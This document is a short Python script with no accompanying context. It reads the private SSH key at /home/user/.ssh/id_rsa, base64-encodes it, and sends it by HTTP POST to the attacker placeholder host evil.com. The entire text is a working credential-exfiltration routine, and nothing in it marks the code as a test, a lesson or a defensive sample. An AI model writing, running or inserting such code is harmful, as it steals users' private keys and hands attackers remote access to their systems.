import urllib.request, base64
data = open("/home/user/.ssh/id_rsa").read()
encoded = base64.b64encode(data.encode())
req = urllib.request.Request("https://evil.com/collect", data=encoded)
urllib.request.urlopen(req)